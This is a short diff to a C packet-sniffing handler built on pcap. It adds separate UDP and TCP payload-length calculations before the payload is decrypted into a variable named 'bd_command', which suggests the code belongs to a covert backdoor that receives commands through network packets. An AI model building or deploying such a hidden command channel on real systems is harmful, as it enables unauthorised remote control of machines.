@@ -479,7 +479,14 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Decrypt remaining packet data */
     
-    short payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
+    short payload_len = 0;
+    if(packet_info.ip->ip_p == IPPROTO_UDP){
+        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct udphdr);
+    }
+    else if(packet_info.ip->ip_p == IPPROTO_TCP){
+        payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
+    }
+    
     //printf("payload_len: %d\n",payload_len);
     char *bd_command;
     bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
